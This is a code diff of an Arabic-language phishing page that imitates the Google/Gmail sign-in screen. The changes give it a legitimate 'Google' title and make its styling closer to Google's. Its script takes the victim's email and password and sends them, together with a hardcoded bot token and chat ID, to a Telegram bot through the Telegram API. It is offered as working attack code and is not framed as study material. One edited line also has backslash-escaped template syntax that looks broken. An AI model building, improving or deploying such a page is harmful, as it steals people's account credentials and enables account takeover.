@@ -2,14 +2,19 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title> للمتابعه لموقع التسريبات سجل الدخول بجوجل </title>
+  <title>تسجيل الدخول - Google</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
       margin: 0;
-      background: url("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSq19yICTWAbF0PgoNE2Iq5KE58cYS2ySo7-C5TSZVZypdg4KvLTTC8hmRv&s=10") no-repeat center center fixed;
+      font-family: 'Roboto', sans-serif;
+      background: #f2f2f2 url("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSq19yICTWAbF0PgoNE2Iq5KE58cYS2ySo7-C5TSZVZypdg4KvLTTC8hmRv&s=10") no-repeat center center fixed;
       background-size: cover;
-      font-family: 'Roboto', 'Tahoma', sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -17,18 +22,13 @@
     }
 
     .form-wrapper {
+      background: rgba(255, 255, 255, 0.95);
       width: 100%;
       max-width: 400px;
-      animation: fadeIn 0.5s ease-in-out;
-    }
-
-    .form-container {
-      background: #fff;
-      width: 100%;
       padding: 40px 30px;
-      border-radius: 16px;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.3);
-      text-align: right;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+      animation: fadeIn 0.5s ease-in-out;
     }
 
     @keyframes fadeIn {
@@ -36,16 +36,17 @@
       to { opacity: 1; transform: translateY(0); }
     }
 
-    .form-container img {
+    .form-wrapper img {
       display: block;
-      margin: 0 auto 25px;
-      height: 45px;
+      margin: 0 auto 20px;
+      height: 30px;
     }
 
     h2 {
       font-size: 24px;
-      margin: 0 0 12px;
       color: #202124;
+      margin: 0 0 12px;
+      font-weight: 400;
     }
 
     p {
@@ -60,25 +61,26 @@
 
     input {
       width: 100%;
-      padding: 12px 10px;
+      padding: 14px 10px;
       font-size: 16px;
       border: 1px solid #dadce0;
-      border-radius: 6px;
+      border-radius: 4px;
       outline: none;
-      transition: border 0.2s;
+      transition: border-color 0.2s;
     }
 
     input:focus {
-      border: 2px solid #1a73e8;
+      border-color: #1a73e8;
+      box-shadow: 0 0 0 1px #1a73e8;
     }
 
     button {
       background-color: #1a73e8;
       color: white;
       border: none;
-      padding: 10px;
-      font-size: 15px;
-      border-radius: 6px;
+      padding: 12px;
+      font-size: 14px;
+      border-radius: 4px;
       width: 100%;
       cursor: pointer;
       margin-top: 10px;
@@ -102,19 +104,17 @@
   </style>
 </head>
 <body>
-  <div class="form-wrapper">
-    <div class="form-container" id="formBox">
-      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png">
-      <h2>تسجيل الدخول</h2>
-      <p>انتقل إلى Gmail</p>
-      <div class="input-group">
-        <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف">
-      </div>
-      <a class="link" href="#">هل نسيت البريد الإلكتروني؟</a>
-      <button onclick="goToPassword()">التالي</button>
-      <a class="link" href="#">استخدام حساب آخر</a>
-      <div class="status" id="status"></div>
+  <div class="form-wrapper" id="formBox">
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png">
+    <h2>تسجيل الدخول</h2>
+    <p>انتقل إلى Gmail</p>
+    <div class="input-group">
+      <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف">
     </div>
+    <a class="link" href="#">هل نسيت البريد الإلكتروني؟</a>
+    <button onclick="goToPassword()">التالي</button>
+    <a class="link" href="#">استخدام حساب آخر</a>
+    <div class="status" id="status"></div>
   </div>
 
   <script>
@@ -144,7 +144,7 @@
     }
 
     function goBack() {
-      location.reload(); // يرجع لنموذج البريد
+      location.reload();
     }
 
     function sendData(email) {
@@ -162,7 +162,7 @@
       const message = `📥 تسجيل دخول جديد:\n📧 البريد: ${email}\n🔐 كلمة المرور: ${password}`;
       const token = "8185557975:AAEDUZuAvskBZTTvSqyHKfcVuR3CfoRjp3U";
       const chat_id = "6894787120";
-      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+      const url = \`https://api.telegram.org/bot\${token}/sendMessage?chat_id=\${chat_id}&text=\${encodeURIComponent(message)}\`;
 
       fetch(url)
         .then(res => {
